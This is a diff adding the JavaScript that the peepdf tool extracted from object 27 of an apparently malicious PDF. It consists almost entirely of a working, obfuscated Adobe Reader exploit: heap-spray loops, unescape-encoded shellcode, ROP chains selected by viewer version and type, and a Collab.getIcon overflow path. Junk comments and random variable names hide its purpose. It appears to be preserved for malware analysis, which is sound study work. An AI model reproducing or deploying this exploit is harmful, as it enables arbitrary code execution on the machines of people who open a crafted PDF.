@@ -1,0 +1,100 @@
+// peepdf comment: Javascript code located in object 27 (version 0)
+
+var unes = unescape //jfpajg';[]'
+var sc
+for (i = 0; i < 18000; i++)
+sc = sc + 0x60
+var sc1
+for (i = 0; i < 18000; i++)
+sc1 = sc1 + 0x60
+var sc2
+for (i = 0; i < 18000; i++)
+sc2 = sc2 + 0x60
+for (i = 0; i < 18000; i++)
+var sc3
+sc3 = sc3 + 0x60
+var sc4
+for (i = 0; i < 18000; i++)
+sc4 = sc4 + 0x60
+var strTempA = "byteToChar";
+var strTempB = "getI" //sgjlsg;slg;
+strTempB += "con";
+var strTempC = "collect" //gwwmjhg[lep'lgf;s
+strTempC += "EmailInfo";
+
+
+function rep(count, what) {
+    var v = "";
+    while (--count >= 0) v += what;
+    return v;
+}
+
+function myunes(buf) {
+    var ret = ""
+    for (var x = 0; x < buf["length"]; x += 2) {
+        ret = ret + util[strTempA](Number("0x" + buf["substr"](x, 2))); //
+    }
+    return ret;
+}
+sc1 = unes("%u0c0C%u11eB%u5bfc%u334b%u66c9%u2eb9%u8003" + "%u0b34%ue28f%uebfa%ue805%uffeb%uffff%ubf67%u8f8f" + "%u228f%uf214%u2350%u5587%u99f9%u75ea%u639f%u8c18" + "%u7483%u7218%ubc80%u0545%u65d4%u05c6%u5667%uac05" + "%u1766%u0571%uff81%u60fc%u69b9%u0098%u0cf4%u3a36" + "%ud4f7%u06da%u0e6a%uc763%u8f8d%u068f%u73d2%ubfe5" + "%uebd6%u8e04%ucf04%u0483%u93ff%u0422%u87d7%u83e5" + "%u04d6%u73f2%udcde%ufb70%u7300%ufc67%u8f8d%ud68f" + "%ucb06%u7300%u616d%u8ee5%u02d1%u7bca%ud9df%u8804" + "%u5f70%uca06%ub27f%u7070%u7070%u8bfa%ud9c9%u6764" + "%u8fb2%u8faf%uf88f%uc98b%u64d9%ue552%ue58f%ue78f" + "%u9d8f%u8f8f%u04d9%u8bc8%u5f70%u8fe5%uca02%udf63" + "%u87e5%uca02%udf37%u04d9%u87c8%u5f70%u4f0a%u8bfa" + "%ud9c9%u3b64%uf20e%udf37%udfeb%ufbcb%uc98b%u64d9" + "%u0e28%u33f2%u7160%u2165%u8bfb%ud9c9%u1564%ufa70" + "%ue57f%u70cf%u83d8%uca06%u0a57%ufa4f%u668a%u8e68");
+
+sc2 = unes("%u8f8f%u8fe5%u8fe5%u8fe5%u70d9%u8bd8%u8fe5%uca02" + "%udf63%ufa70%u707f%u57fa%u70d9%u87d8%u4f0a%u8afa" + "%u4b66%u8f8e%ud98f%ud870%u049f%u57d2%u0c04%u9d9f" + "%u8f8f%uca06%u0467%u9b0c%u8f9d%u068f%u6bca%u0c04" + "%u9d97%u8f8f%uca06%u8c6f%u6bca%uca8c%u0667%u53ca" + "%u05c7%u8c1b%u9d93%u8f8f%u4dbf%u1b07%u938c%u8f9d" + "%u0a8f%uf84f%u0264%u370a%u7071%udf70%u77e7%u8f8f" + "%u708f%u9bd8%u3402%u9d93%u8f8f%u460e%u7070%u7070" + "%u4fbe%u217d%u5e78%u40a6%u7106%u4506%u3202%u7137" + "%u7070%u460e%u7070%u7070%u217d%u06c0%u7c5e%ue52b" + "%u028d%u370a%u7071%udf70%uf204%u7073%u97d8%u70b2" + "%u7070%ufa70%u668a%u8ea0%u8f8f%uca06%u0647%u704d" + "%u67fa%u0c02%u9d93%u8f8f%uca8c%udf6f%u36dd%u8e8f")
+sc3 = unes("%u8f8f%udb05%u71c7%ufb05%u70c7%ufb07%u71c7%udb07" + "%u70c7%u616d%ud870%u7093%u47fa%ud870%ue59f%u028f" + "%u370a%u7071%udf70%ud870%u70af%uabd8%uca06%u065f" + "%u0649%u0e48%u7046%u7070%ube70%u7d4f%u7821%uc65e" + "%uc206%u0243%u3732%u7071%u0770%u808b%u05c6%u818b" + "%uadb3%u90fa%u05c6%u818b%uadb3%u88fb%ucb07%u8e80" + "%u64c6%u8e7d%u0e40%u8d48%u8f8f%u068f%u4ff2%u9c66" + "%u8f8f%u058f%u818b%uafb3%u89fb%u8b07%uc680%u7c64" + "%u408e%u06c8%u4ff2%ufa70%ue57f%u04cf%u73da%udd70" + "%u0683%u5bca%u4806%ufa04%u8c67%u6ffa%u518e%u490e" + "%u9d93%u8f8f%uc204%u7c6b%u042b%u73f2%u8fe5%ufa70" + "%u704f%u97d8%uca06%ub24b%u7070%u7070%ud4fb%u06d8" + "%u704c%u7ffa%ufa70%udf5b%ud870%udc93%ud870%u049f")
+sc4 = unes("%u4ff2%u460e%u7070%u7070%u4fbe%u217d%u5e78%u40a6" + "%u7106%u3202%u7237%u7070%u8848%ue2ec%ua1eb%uc848" + "%uea8b%ueaf7%u48af%u87c8%ueca0%uadaf%u480e%u8f83" + "%u8f8f%u2b7c%u49c0%uad88%u49c8%u8f88%ue5d0%u028f" + "%u370a%u7072%udf70%ud870%u70af%ua7d8%u8fe5%u70df" + "%ua3d8%udadc%ud8d9%ue304%u97ab%uca04%u04b3%u8adb" + "%u8ef7%u0465%u97c5%ud504%u8eaf%u6c64%uc6bd%ubb04" + "%u8e04%ube61%u7370%u4fbe%ub723%ufb6f%u4e88%u8240" + "%u488e%u7d64%uf3b4%u9bab%u6efa%ud504%u8eab%ue964" + "%u8304%u04c4%u93d5%u648e%u8b04%u8e04%u6467%ube8d" + "%u064f%ud065%ud2d1%u4dd4%u8f87");
+////////////agjpg;./.gw]\qwgkq
+sc = "" + sc1 + "" + sc2 + "" + sc3 + sc4;
+
+function exp8() {
+    blah = rep(128, unes("%u4242%u4242%u4242%u4242%u4242")) + sc;
+    bbk = unes("%u4242%u4242");
+    var h = "getIcon";
+    wap = 0x24 + blah["length"]
+    while (bbk["length"] < wap) bbk += bbk;
+    fillbk = bbk["substring"](0, wap);
+    bk = bbk["substring"](0, bbk["length"] - wap);
+    while (bk["length"] + wap < 262144) bk = bk + bk + fillbk;
+    mm = new Array() //jf;afkla'[
+    for (i = 0; i < 350; i++) mm[i] = bk + blah;
+    of = rep(4096, myunes("0a0a0a0a"));
+    var a = ["_N.bundle"]; //next time
+    var b = 5; //shlshgl
+    Collab[h](of + a[b - b]) //ajf[pa';[
+}
+var jdklgj = app //wg;hhkg
+if (jdklgj.viewerVersion >= 9.00) //glwgjwpjp]';"
+{
+    var LbWxSqgNmAwjUaoXaywhlH = unescape //agj;akga][kw[jg'	
+    var TCfIpiOxOYTTeNgDQsDQaDtVjQ;
+    for (i = 0; i < 18000; i++)
+    TCfIpiOxOYTTeNgDQsDQaDtVjQ = TCfIpiOxOYTTeNgDQsDQaDtVjQ + 0x70;
+
+
+
+
+    var scdt1 = "%u0C0C%u0C0C%u1062%u4a80%u4141%u4141%u6e6a%u4a80%u63a5%u4a80" + "%u0000%u4a8a%u1062%u4a80%u4141%u4141%u1eba%u4a81" + "%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80" + "%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000" + "%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000" + "%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80" + "%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84" + "%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000" + "%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000" + "%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80" + "%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84" + "%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000" + "%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80" + "%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000" + "%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80" + "%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80" + "%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000" + "%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80" + "%u21b2%u4a80%uffff%uffff%uffff%uffff%u1000%u0000"
+    var scdt2 = "%u0C0C%u0C0C%u4919%u0700%u12bb%u0700%u1022%u0700%u0C0C%u0C0C" + "%u0C0C%u0C0C%u1599%u0700%u0124%u0001%u72f7%u0700" + "%u0104%u0001%u15bb%u0700%u1000%u0000%u154d%u0700" + "%u15bb%u0700%u0300%u7ffe%u7fb2%u0700%u15bb%u0700" + "%u0011%u0001%ua8ac%u0700%u15bb%u0700%u0100%u0001" + "%ua8ac%u0700%u72f7%u0700%u0011%u0001%u52e2%u0700" + "%u5c54%u0700%uffff%uffff%u0100%u0001%u0000%u0000" + "%u0104%u0001%u1000%u0000%u0040%u0000" + "%ud731%u0700%u15bb%u0700%u905a%u9054%u154d%u0700%ua722" + "%u0700%u15bb%u0700%ueb5a%u5815%u154d%u0700%ua722%u0700%u15bb%u0700%u1a8b%u1889%u154d%u0700%ua722%u0700" + "%u15bb%u0700%uc083%u8304%u154d%u0700%ua722%u0700%u15bb%u0700%u04c2%ufb81%u154d%u0700%ua722%u0700%u15bb" + "%u0700%u0C0C%u0C0C%u154d%u0700%ua722%u0700%u15bb%u0700%uee75%u05eb%u154d%u0700%ua722%u0700%u15bb%u0700" + "%ue6e8%uffff%u154d%u0700%ua722%u0700%u15bb%u0700%u90ff%u9090%u154d%u0700%ua722%u0700%u15bb%u0700%u9090" + "%u9090%u154d%u0700%ua722%u0700%u15bb%u0700%u9090%u9090%u154d%u0700%ua722%u0700%u15bb%u0700%uffff%u90ff" + "%u154d%u0700%ud731%u0700%u112f%u0700"
+    var scdtreal = "%u38e8%u0000%uad00%u7d9b%uacdf%uda08%u1676%ufa65" + "%uec10%u0397%ufb0c%ufd97%u330f%u8aca%uea5b%u8a49" + "%ud9e8%u238a%u98e9%u8afe%u700e%uef73%uf636%ub922" + "%ue67c%u8f17%u837b%ub5b9%u0478%u3249%u5bd3%u8955" + "%u81e5%u48ec%u0002%u8900%ufc5d%u306a%u6459%u018b" + "%u408b%u8b0c%u1c70%u8bad%u0858%u8b53%ufc7d%u77ff" + "%ue834%u02ba%u0000%u4789%u3134%u50c0%u6568%u336c" + "%u6832%u656b%u6e72%ue089%uff50%u3457%uc389%u0d6a" + "%u8b59%ufc7d%u5351%u74ff%ufc8f%u91e8%u0002%u5900" + "%u4489%ufc8f%ueee2%u016a%u8d5e%uf445%u5650%u078b" + "%ud0ff%u4589%u3df0%uffff%uffff%u0475%u5646%ue8eb" + "%u003d%u0020%u7700%u4604%ueb56%u6add%u6a00%u6800" + "%u1200%u0000%u8b56%u0447%ud0ff%u006a%u458d%u50ec" + "%u086a%u458d%u50b8%u8b56%u0847%ud0ff%uc085%u0475" + "%u5646%ub4eb%u7d81%u50b8%u5064%u7444%u4604%ueb56" + "%u81a7%ubc7d%ufeef%uaeea%u0474%u5646%u9aeb%u75ff" + "%u6af0%uff40%u0c57%u4589%u85d8%u75c0%ue905%u0205" + "%u0000%u006a%u006a%u006a%uff56%u0457%u006a%u458d" + "%u50ec%u75ff%ufff0%ud875%uff56%u0857%uc085%u0575" + "%ue2e9%u0001%u5600%u57ff%u8b10%ud85d%u838b%u1210" + "%u0000%u4589%u8be8%u1483%u0012%u8900%ue445%u838b" + "%u1218%u0000%u4589%u03e0%ue445%u4503%u89e8%udc45" + "%u8a48%u0394%u121c%u0000%uc230%u9488%u1c03%u0012" + "%u8500%u77c0%u8deb%ub885%ufffe%u50ff%uf868%u0000" + "%uff00%u1457%ubb8d%u121c%u0000%uc981%uffff%uffff" + "%uc031%uaef2%ud1f7%ucf29%ufe89%uca89%ubd8d%ufeb8" + "%uffff%uc981%uffff%uffff%uaef2%u894f%uf3d1%u6aa4" + "%u8d02%ub885%ufffe%u50ff%u7d8b%ufffc%u1857%uff3d" + "%uffff%u75ff%ue905%u014d%u0000%u4589%u89c8%uffc2" + "%ue875%u838d%u121c%u0000%u4503%u50e0%ub952%u0100" + "%u0000%u548a%ufe48%u748a%uff48%u7488%ufe48%u5488" + "%uff48%ueee2%u57ff%uff1c%uc875%u57ff%u8d10%ub885" + "%ufffe%ue8ff%u0000%u0000%u0481%u1024%u0000%u6a00" + "%u5000%u77ff%uff24%u2067%u57ff%u8924%ud045%uc689" + "%uc789%uc981%uffff%uffff%uc031%uaef2%ud1f7%u8949" + "%ucc4d%ubd8d%ufeb8%uffff%u0488%u490f%u048a%u3c0e" + "%u7522%u491f%u048a%u3c0e%u7422%u8807%u0f44%u4901" + "%uf2eb%ucf01%uc781%u0002%u0000%u7d89%ue9c0%u0013" + "%u0000%u048a%u3c0e%u7420%u8806%u0f04%ueb49%u01f3" + "%u47cf%u7d89%uffc0%uf075%u406a%u558b%ufffc%u0c52" + "%u4589%u89d4%u8bc7%ue875%u7503%u01e0%u81de%u1cc6" + "%u0012%u8b00%ue44d%ua4f3%u7d8b%u6afc%uff00%uc075" + "%u57ff%u8918%uc445%uff3d%uffff%u74ff%u576a%uc389" + "%u75ff%ufff0%ud475%uff50%u1c57%uff53%u1057%u7d8b" + "%u81c0%uffc9%uffff%u31ff%uf2c0%uf7ae%u29d1%u89cf" + "%u8dfe%ub8bd%ufffd%uc7ff%u6307%u646d%uc72e%u0447" + "%u7865%u2065%u47c7%u2f08%u2063%u8122%u0cc7%u0000" + "%uf300%u4fa4%u07c6%u4722%u07c6%u5f00%u858d%ufdb8" + "%uffff%u00e8%u0000%u8100%u2404%u0010%u0000%u006a" + "%uff50%u2477%u67ff%uff20%u2c57%u006a%uff50%u3057" + "%u5553%u5756%u6c8b%u1824%u458b%u8b3c%u0554%u0178" + "%u8bea%u184a%u5a8b%u0120%ue3eb%u4932%u348b%u018b" + "%u31ee%ufcff%uc031%u38ac%u74e0%uc107%u0dcf%uc701" + "%uf2eb%u7c3b%u1424%ue175%u5a8b%u0124%u66eb%u0c8b" + "%u8b4b%u1c5a%ueb01%u048b%u018b%uebe8%u3102%u89c0" + "%u5fea%u5d5e%uc25b%u0008"
+    if (jdklgj.viewerType == "Exchange-Pro") {
+        var TCfIpiOxOYTTeNgDQsDQaDtVjQ = LbWxSqgNmAwjUaoXaywhlH(scdt2 + scdtreal);
+    } else {
+        var TCfIpiOxOYTTeNgDQsDQaDtVjQ = LbWxSqgNmAwjUaoXaywhlH(scdt1 + scdtreal);
+    }
+
+    var XKtjCxpAIbqdRwoMdiBCpVSjcTYFRzGELEihzuiDjaUHqPKUpjzVplIanruZkjmlHjJpV = LbWxSqgNmAwjUaoXaywhlH("%" + "u" + "0" + "C" + "0" + "C" + "%u" + "0" + "C" + "0" + "C");
+    while (XKtjCxpAIbqdRwoMdiBCpVSjcTYFRzGELEihzuiDjaUHqPKUpjzVplIanruZkjmlHjJpV["length"] + 28 < 65536)
+    XKtjCxpAIbqdRwoMdiBCpVSjcTYFRzGELEihzuiDjaUHqPKUpjzVplIanruZkjmlHjJpV += XKtjCxpAIbqdRwoMdiBCpVSjcTYFRzGELEihzuiDjaUHqPKUpjzVplIanruZkjmlHjJpV;
+    KamKpVdorBTYgaOYYulKQswCiJyjvhZksBoGyWoNohJhsqyPygdvFvAalRntpAyIGDrzYxVhTGNylo = XKtjCxpAIbqdRwoMdiBCpVSjcTYFRzGELEihzuiDjaUHqPKUpjzVplIanruZkjmlHjJpV["substring"](0, (3084 - 36) / 2);
+    KamKpVdorBTYgaOYYulKQswCiJyjvhZksBoGyWoNohJhsqyPygdvFvAalRntpAyIGDrzYxVhTGNylo += TCfIpiOxOYTTeNgDQsDQaDtVjQ;
+    KamKpVdorBTYgaOYYulKQswCiJyjvhZksBoGyWoNohJhsqyPygdvFvAalRntpAyIGDrzYxVhTGNylo += XKtjCxpAIbqdRwoMdiBCpVSjcTYFRzGELEihzuiDjaUHqPKUpjzVplIanruZkjmlHjJpV;
+    KoHQQkRIckZJKtdlKTGyUUS = KamKpVdorBTYgaOYYulKQswCiJyjvhZksBoGyWoNohJhsqyPygdvFvAalRntpAyIGDrzYxVhTGNylo["substring"](0, 65536 / 2);
+    while (KoHQQkRIckZJKtdlKTGyUUS["length"] < 524288) KoHQQkRIckZJKtdlKTGyUUS += KoHQQkRIckZJKtdlKTGyUUS;
+    bdfzsvuobNyDZnrqvFjkFWMnGaDbvlYCKTfwjiCwLEXKoTngADhROnZManDz = KoHQQkRIckZJKtdlKTGyUUS["substring"](0, 524288 - 4120 / 2) //ashlfajl;afj
+    var JkNUxvkKFXvIXewntXRjnLOytMONPyrcUEpPSGrzHuBijVDY = new Array() //ip[wo][]l;
+    for (tYzswEF = 0; tYzswEF < 496; tYzswEF++) JkNUxvkKFXvIXewntXRjnLOytMONPyrcUEpPSGrzHuBijVDY[tYzswEF] = bdfzsvuobNyDZnrqvFjkFWMnGaDbvlYCKTfwjiCwLEXKoTngADhROnZManDz + "s";
+    //shklfh
+    //ahf;lajf;
+} else {
+    exp8();
+
+}
+
